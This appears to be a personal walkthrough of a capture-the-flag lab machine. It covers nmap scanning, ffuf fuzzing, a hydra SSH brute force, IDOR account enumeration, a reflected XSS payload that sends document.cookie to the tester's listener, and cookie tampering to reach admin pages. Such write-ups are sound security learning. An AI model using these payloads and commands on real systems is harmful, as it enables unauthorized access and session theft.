
# Nmap: 

Lets start with a basic scan and see what we can find:
`sudo nmap -sV -sC 10.129.95.191 -oN nmap.basic`

![[Pasted image 20250519225432.png]]

When that scan is done I want to do a deeper scan and run that while I do other tasks.

`sudo nmap -p- -sV -sC --script=default,vuln,exploit -T4 -oN nmap.full 10.129.95.191`

^^ ==This scan returned a ton of CVEs for bother services so I am looking into that== 

![[Pasted image 20250519232120.png]]

==Thoughts==: Looks like http is open, so lets navigate there.

==Might as well scan the server with NUCLEI== <- Gets us nothing.

I did find an email though:
![[Pasted image 20250519230444.png]]

Let's research what we can do with this

# Lets use ffuf!
`ffuf -w /opt/redteam/Assetnote/automated/httparchive_directories_1m_2024_05_28.txt -u http://10.129.95.191/FUZZ`

^^ ==found many directories but most are not accessible==

# Brute force ssh with `admin` username:
`hydra -l admin -P /opt/redteam/SecLists/Passwords/Leaked-Databases/rockyou-75.txt ssh://10.129.95.191 -V -t 4`

^^ This puppy went for 8 hours. I got nothin..


# Found url /cdn-cdi/login:
1. Allows guest login
2. You can abuse the url:
	1. `http://10.129.95.191/cdn-cgi/login/admin.php?content=accounts&id=1`
![[Pasted image 20250520223318.png]]


# Vulnerable to XSS:

I opened up a python server

`http://10.129.95.191/cdn-cgi/login/admin.php?content=clients&orgId=%3Cscript%3Enew%20Image().src%3D%27http%3A//10.10.16.54/cookie%3Fc%3D%27%2Bdocument.cookie;%3C/script%3E`

# Edit the cookie:

![[Pasted image 20250520230417.png]]

I changed the id to 34332 and the user to admin to get access to the uploads page.

==The user john (user 4) is also present==
![[Pasted image 20250521223123.png]]


==Super admin==
![[Pasted image 20250521223643.png]]